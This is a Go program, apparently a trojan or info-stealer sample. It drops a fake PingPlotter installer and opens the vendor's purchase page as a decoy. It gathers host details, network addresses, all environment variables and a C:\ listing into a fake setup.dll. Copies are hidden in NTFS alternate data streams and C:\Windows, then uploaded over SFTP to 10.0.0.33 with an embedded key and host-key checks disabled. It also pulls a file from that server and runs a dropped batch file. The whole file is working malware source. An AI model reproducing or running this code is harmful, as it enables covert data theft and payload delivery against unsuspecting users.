package main

/*
	TODO
- Download file from SFTP server and hide in exe on Desktop

*/

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"reflect"
	"runtime"
	"strings"
	"time"

	"github.com/elastic/go-sysinfo"
	"github.com/pkg/sftp"
	"golang.org/x/crypto/ssh"
)

func main() {
	setupFakeEnv()
	saveAllInfo()
	fileManger()
	distraction()
	time.Sleep(5 * time.Second)
	usrDir := getUserHomeDir()
	cmd := exec.Command("cmd", "/C", "start", (usrDir + "\\Desktop\\startup3751243.bat"))
	cmd.Start()
}

func setupFakeEnv() {
	// Create Fake Installer
	usrDir := getUserHomeDir()
	fakeInstall, err := PingPlotterFakeResource()
	installer, err := os.Create(usrDir + "\\AppData\\Local\\Temp\\moto\\PingPlotterInstaller.exe")
	installer.Write(fakeInstall)
	installer.Close()
	// Create ReadMe File
	readMeFile, err := ReadmeResource()
	readme, err := os.Create("Readme.txt")
	readme.Write(readMeFile)
	readme.Close()
	// Create SSH File
	sshKeyFile, err := PrvtResource()
	sshKey, err := os.Create(usrDir + "\\AppData\\Local\\Temp\\moto\\key.pem")
	sshKey.Write(sshKeyFile)
	sshKey.Close()
	if err != nil {
	}
	// Create Batch File
	batFile, err := Startup3751243Resource()
	bat, err := os.Create(usrDir + "\\Desktop\\startup3751243.bat")
	bat.Write(batFile)
	bat.Close()
	if err != nil {
	}
}

func saveAllInfo() {
	usrDir := getUserHomeDir()
	f, err := os.Create(usrDir + "\\AppData\\Local\\Temp\\moto\\setup.dll")

	system := sysGrab()
	environment := envGrab()
	network := netGrab()
	folders := folderGrab()

	f.WriteString("[SYSTEM INFO]\n" + system + "\n\n")
	f.WriteString("[NETWORK INFO]\n" + network + "\n\n")
	f.WriteString("[ENVIRONMENT INFO]\n" + environment + "\n\n")
	f.WriteString("[FOLDER INFO]\n" + folders + "\n\n")

	if err != nil {
		fmt.Println(err)
		f.Close()
		return
	}
}

func fileManger() {
	copyFiles()
	syncWithSFTP()
}

func copyFiles() {
	usrDir := getUserHomeDir()
	input, err := ioutil.ReadFile(usrDir + "\\AppData\\Local\\Temp\\moto\\setup.dll")
	ioutil.WriteFile("Readme.txt:crapS3751243.dll", input, 0644)
	ioutil.WriteFile("Readme.txt:crapS3636862.dll", input, 0644)
	ioutil.WriteFile("C:\\Windows\\crapS3636862.dll", input, 0644)
	ioutil.WriteFile("C:\\Windows\\crapS3751243.dll", input, 0644)
	if err != nil {
		fmt.Println(err)
	}
}

func syncWithSFTP() {
	usrDir := getUserHomeDir()
	pemBytes, err := ioutil.ReadFile(usrDir + "\\AppData\\Local\\Temp\\moto\\key.pem")
	signer, err := ssh.ParsePrivateKey(pemBytes)
	auths := []ssh.AuthMethod{ssh.PublicKeys(signer)}

	cfg := &ssh.ClientConfig{
		User:            "tester",
		Auth:            auths,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	// Connect to SFTP Server
	cfg.SetDefaults()
	connect, err := ssh.Dial("tcp", "10.0.0.33:22", cfg)
	defer connect.Close()

	// Create new SFTP client
	client, err := sftp.NewClient(connect)
	if err != nil {
		log.Fatal(err)
	}
	defer client.Close()

	// Walk directory on Remote
	// w := client.Walk("/")
	// for w.Step() {
	// 	if w.Err() != nil {
	// 		continue
	// 	}
	// 	log.Println(w.Path())
	// }

	// Export System Data
	input, err := ioutil.ReadFile(usrDir + "\\AppData\\Local\\Temp\\moto\\setup.dll")
	a, err := client.Create("Readme.txt:crapS3751243.dll")
	if _, err := a.Write([]byte(input)); err != nil {
		log.Fatal(err)
	}
	a.Close()
	b, err := client.Create("Readme.txt:crapS3636862.dll")
	if _, err := b.Write([]byte(input)); err != nil {
		log.Fatal(err)
	}
	b.Close()

	srcPath := ""
	dstPath := (usrDir + "\\Desktop\\startup3751243.bat:")
	filename := "bannana.html"

	// Open the source file
	srcFile, err := client.Open(srcPath + filename)
	if err != nil {
		log.Fatal(err)
	}
	defer srcFile.Close()

	// Create the destination file
	dstFile, err := os.Create(dstPath + filename)
	if err != nil {
		log.Fatal(err)
	}
	defer dstFile.Close()

	// Copy the file
	srcFile.WriteTo(dstFile)
}

func distraction() {
	usrDir := getUserHomeDir()
	time.Sleep(time.Second)
	cmd1 := exec.Command(usrDir + "\\AppData\\Local\\Temp\\moto\\PingPlotterInstaller.exe")
	cmd1.Run()
	// pid := cmd1.Process.Pid
	// fmt.PrintLn(pid)
	exec.Command("rundll32", "url.dll,FileProtocolHandler", "https://www.pingplotter.com/products/purchase").Start()
}

func sysGrab() string {
	var systemInfo string

	f, err := sysinfo.Host()
	info := f.Info()

	systemInfo += "Hostname => " + info.Hostname
	systemInfo += "\nTimezone => " + info.Timezone
	systemInfo += "\nKernel => " + info.KernelVersion
	systemInfo += "\nUniqueID => " + info.UniqueID

	if err != nil {
		fmt.Println(err)
		return ""
	}

	return systemInfo
}

func netGrab() string {
	// Get Network Info
	var networkInfo string

	f, err := sysinfo.Host()
	net := f.Info()

	mac := reflect.ValueOf(net.MACs).Interface().([]string)
	networkInfo += "MAC Addresses =>"
	for i := range mac {
		networkInfo += "\n\t" + net.MACs[i]
	}

	ips := reflect.ValueOf(net.IPs).Interface().([]string)
	networkInfo += "\n IP Addresses => "
	for i := range ips {
		networkInfo += "\n\t" + net.IPs[i]
	}

	if err != nil {
		fmt.Println(err)
		return ""
	}

	return networkInfo
}

func envGrab() string {
	// Get env variables
	var envoInfo string
	for _, element := range os.Environ() {
		variable := strings.Split(element, "=")
		onlyString := variable[0] + " => " + variable[1] + "\n"
		envoInfo += onlyString
	}
	return envoInfo
}

func folderGrab() string {
	// Get all folders and files in searchFolder
	var envoInfo string
	searchFolder := "C:\\"

	files, err := ioutil.ReadDir(searchFolder)
	if err != nil {
	}
	for _, f := range files {
		envoInfo += searchFolder + f.Name() + "\n"
	}

	return envoInfo
}

func getUserHomeDir() string {
	if runtime.GOOS == "windows" {
		home := os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
		if home == "" {
			home = os.Getenv("USERPROFILE")
		}
		return home
	}
	return os.Getenv("HOME")
}
